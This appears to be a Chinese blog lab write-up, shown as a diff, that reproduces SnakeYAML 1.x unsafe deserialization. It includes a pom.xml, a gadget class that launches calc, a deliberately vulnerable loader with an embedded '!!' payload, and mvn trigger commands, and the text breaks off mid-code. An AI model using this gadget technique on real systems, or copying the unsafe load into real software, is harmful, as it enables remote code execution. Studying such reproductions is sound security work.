@@ -1,0 +1,398 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>SnakeYAML 漏洞示例 | 1ux4ry Archive</title><meta name=description content="漏洞复现"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#概述>概述</a></li><li><a href=#原理>原理</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label="SnakeYAML  漏洞示例"><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./SNAKEYAML__漏洞示例</p><div class=article-hero-card__title><span class=article-hero-card__title-main>SnakeYAML 漏洞示例</span>
+<span class=article-hero-card__title-sub>1ux4ry Archive</span></div><p class=article-hero-card__meta>1ux4ry Archive</p><p class=article-hero-card__desc>漏洞复现</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><h1>SnakeYAML 漏洞示例</h1><div class=single-meta><span>2026-09-11</span></div></header><div class="page-copy content-body"><h1 id=概述>概述</h1><p>SnakeYAML 的 <code>Constructor</code> 在默认情况下支持任意类实例化，被官方定义为“设计功能”，但被业界广泛视作高危漏洞</p><h1 id=原理>原理</h1><p>SnakeYAML 1.x 在使用默认 new Yaml().load(不可信输入) 时， 可通过 YAML 全局标签 !!全限定类名 反射实例化 classpath 上的任意类，并在构造方法中执行代码。</p><p>进行编译，然后进行触发漏洞的命令,发现弹出计算机 证明漏洞已经复现成功</p><p>mvn -q exec:java &ldquo;-Dexec.mainClass=com.security.lab.VulnerableDemo&rdquo;</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260718233216772.png alt=image.png loading=lazy decoding=async></figure></p><p>调用链</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260718234231926.png alt loading=lazy decoding=async></figure></p><p>漏洞源码</p><p>漏洞触发的代码段</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>Yaml</span> <span class=n>yaml</span> <span class=o>=</span> <span class=n>new</span> <span class=nf>Yaml</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=n>Object</span> <span class=n>result</span> <span class=o>=</span> <span class=n>yaml</span><span class=p>.</span><span class=nf>load</span><span class=p>(</span><span class=n>yamlText</span><span class=p>);</span>
+</span></span></code></pre></div><p>其中的 pom.xml 所包含的依赖</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>&lt;project</span> <span class=na>xmlns=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;modelVersion&gt;</span>4.0.0<span class=nt>&lt;/modelVersion&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;groupId&gt;</span>com.security.lab<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;artifactId&gt;</span>snakeyaml-vuln-demo<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;version&gt;</span>1.0.0<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;packaging&gt;</span>jar<span class=nt>&lt;/packaging&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;name&gt;</span>SnakeYAML Vulnerability Demo<span class=nt>&lt;/name&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;description&gt;</span>Educational lab: unsafe SnakeYAML deserialization (local only)<span class=nt>&lt;/description&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;properties&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class=nt>&lt;/project.build.sourceEncoding&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.source&gt;</span>1.8<span class=nt>&lt;/maven.compiler.source&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.target&gt;</span>1.8<span class=nt>&lt;/maven.compiler.target&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c>&lt;!-- 1.x 默认允许 !! 标签实例化任意类；2.0+ 默认更安全 --&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;snakeyaml.version&gt;</span>1.33<span class=nt>&lt;/snakeyaml.version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/properties&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;dependencies&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.yaml<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>snakeyaml<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${snakeyaml.version}<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/dependencies&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;build&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;plugins&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;groupId&gt;</span>org.apache.maven.plugins<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;artifactId&gt;</span>maven-compiler-plugin<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;version&gt;</span>3.11.0<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;source&gt;</span>1.8<span class=nt>&lt;/source&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;target&gt;</span>1.8<span class=nt>&lt;/target&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;encoding&gt;</span>UTF-8<span class=nt>&lt;/encoding&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;groupId&gt;</span>org.apache.maven.plugins<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;artifactId&gt;</span>maven-jar-plugin<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;version&gt;</span>3.3.0<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;archive&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;manifest&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                            <span class=nt>&lt;mainClass&gt;</span>com.security.lab.VulnerableDemo<span class=nt>&lt;/mainClass&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=nt>&lt;/manifest&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/archive&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;groupId&gt;</span>org.codehaus.mojo<span class=nt>&lt;/groupId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;artifactId&gt;</span>exec-maven-plugin<span class=nt>&lt;/artifactId&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;version&gt;</span>3.1.0<span class=nt>&lt;/version&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nt>&lt;mainClass&gt;</span>com.security.lab.VulnerableDemo<span class=nt>&lt;/mainClass&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/configuration&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/plugin&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/plugins&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/build&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/project&gt;</span>
+</span></span></code></pre></div><p>EvilGadget.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.security.lab</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 教学用 gadget：被 SnakeYAML 通过 !! 标签实例化时弹出计算器。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 仅用于本地安全实验。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>EvilGadget</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>EvilGadget</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>popCalc</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>EvilGadget</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>popCalc</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>popCalc</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[VULN TRIGGERED] 正在启动 calc ...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// Windows：弹出计算器</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;calc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>err</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[!] 启动 calc 失败: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><p>VulnerableDemo.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.security.lab</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.yaml.snakeyaml.Yaml</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.InputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.charset.StandardCharsets</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Files</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Paths</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 最简 SnakeYAML 漏洞触发演示（本地教学）。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 根因：
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   Yaml yaml = new Yaml();
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   yaml.load(untrustedInput);
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 在 SnakeYAML 1.x 中会按全局 Tag 解析 !!全限定类名，并反射实例化该类。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 真实攻防中攻击者可换用 JDK/第三方 gadget（如 ScriptEngineManager + URLClassLoader 等）
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 达到 RCE；本 lab 仅用本地 EvilGadget 证明“构造方法被调用”。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 运行（项目根目录）：
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   mvn -q compile exec:java
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   mvn -q compile exec:java -Dexec.args=&#34;payloads/evil.yml&#34;
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   mvn -q compile exec:java -Dexec.mainClass=com.security.lab.SafeDemo
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>VulnerableDemo</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;=== SnakeYAML 不安全反序列化演示 (VulnerableDemo) ===&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;SnakeYAML 版本见 pom.xml (org.yaml:snakeyaml)&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>yamlText</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>path</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 从文件读取 YAML: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>path</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>path</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>yamlText</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>bytes</span><span class=p>,</span><span class=w> </span><span class=n>StandardCharsets</span><span class=p>.</span><span class=na>UTF_8</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// 内嵌最简 payload：强制实例化 EvilGadget</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>yamlText</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=s>&#34;!!com.security.lab.EvilGadget\n&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 使用内嵌 payload（无参构造）:&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;----&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>print</span><span class=p>(</span><span class=n>yamlText</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;----&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ========== 漏洞点：对不可信输入使用默认 Constructor ==========</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Yaml</span><span class=w> </span><span class=n>yaml</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Yaml</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 调用 new Yaml().load(...)  ...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>yaml</span><span class=p>.</span><span class=na>load</span><span class=p>(</span><span class=n>yamlText</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ============================================================</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] load() 返回对象: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>result</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
